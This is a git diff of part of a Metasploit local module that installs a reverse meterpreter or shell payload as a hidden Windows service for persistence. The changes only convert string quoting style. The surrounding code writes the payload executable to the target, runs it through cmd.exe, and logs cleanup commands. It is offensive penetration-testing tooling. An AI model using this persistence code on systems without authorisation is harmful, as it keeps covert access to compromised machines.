@@ -62,12 +62,12 @@ class MetasploitModule < Msf::Exploit::Local
   #-------------------------------------------------------------------------------
   def exploit
     unless is_system? || is_admin?
-      print_error("Insufficient privileges to create service")
+      print_error('Insufficient privileges to create service')
       return
     end
 
-    unless datastore['PAYLOAD'] =~ %r#^windows/(shell|meterpreter)/reverse#
-      print_error("Only support for windows meterpreter/shell reverse staged payload")
+    unless datastore['PAYLOAD'] =~ %r{^windows/(shell|meterpreter)/reverse}
+      print_error('Only support for windows meterpreter/shell reverse staged payload')
       return
     end
 
@@ -82,11 +82,11 @@ class MetasploitModule < Msf::Exploit::Local
 
     # Add the windows pe suffix to rexename
     unless rexename.end_with?('.exe')
-      rexename << ".exe"
+      rexename << '.exe'
     end
 
     host, _port = session.tunnel_peer.split(':')
-    @clean_up_rc = ""
+    @clean_up_rc = ''
 
     buf = create_payload
     vprint_status(buf)
@@ -101,7 +101,7 @@ class MetasploitModule < Msf::Exploit::Local
     print_status("Cleanup Meterpreter RC File: #{clean_rc}")
 
     report_note(host: host,
-                type: "host.persistance.cleanup",
+                type: 'host.persistance.cleanup',
                 data: {
                   local_id: session.sid,
                   stype: session.type,
@@ -126,30 +126,30 @@ class MetasploitModule < Msf::Exploit::Local
     # check if we have write permission
     if rexepath
       begin
-        temprexe = rexepath + "\\" + rexename
+        temprexe = rexepath + '\\' + rexename
         write_file_to_target(temprexe, rexe)
       rescue Rex::Post::Meterpreter::RequestError
         print_warning("Insufficient privileges to write in #{rexepath}, writing to %TEMP%")
-        temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
+        temprexe = session.sys.config.getenv('TEMP') + '\\' + rexename
         write_file_to_target(temprexe, rexe)
       end
 
     # Write to %temp% directory if not set REMOTE_EXE_PATH
     else
-      temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
+      temprexe = session.sys.config.getenv('TEMP') + '\\' + rexename
       write_file_to_target(temprexe, rexe)
     end
 
     print_good("Meterpreter service exe written to #{temprexe}")
 
     @clean_up_rc << "execute -H -i -f taskkill.exe -a \"/f /im #{rexename}\"\n" # Use interact to wait until the task ended.
-    @clean_up_rc << "rm \"#{temprexe.gsub("\\", "\\\\\\\\")}\"\n"
+    @clean_up_rc << "rm \"#{temprexe.gsub('\\', '\\\\\\\\')}\"\n"
 
     temprexe
   end
 
   def write_file_to_target(temprexe, rexe)
-    fd = session.fs.file.new(temprexe, "wb")
+    fd = session.fs.file.new(temprexe, 'wb')
     fd.write(rexe)
     fd.close
   end
@@ -158,10 +158,10 @@ class MetasploitModule < Msf::Exploit::Local
   #-------------------------------------------------------------------------------
   def log_file
     # Get hostname
-    host = session.sys.config.sysinfo["Computer"]
+    host = session.sys.config.sysinfo['Computer']
 
     # Create Filename info to be appended to downloaded files
-    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')
 
     # Create a directory for the logs
     logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
@@ -169,7 +169,7 @@ class MetasploitModule < Msf::Exploit::Local
     # Create the log directory
     ::FileUtils.mkdir_p(logs)
 
-    logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
+    logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + '.rc'
   end
 
   # Function to install payload as a service
@@ -180,7 +180,7 @@ class MetasploitModule < Msf::Exploit::Local
     begin
       session.sys.process.execute("cmd.exe /c \"#{path}\" #{@install_cmd}", nil, { 'Hidden' => true })
     rescue ::Exception => e
-      print_error("Failed to install the service.")
+      print_error('Failed to install the service.')
       print_error(e.to_s)
     end
 
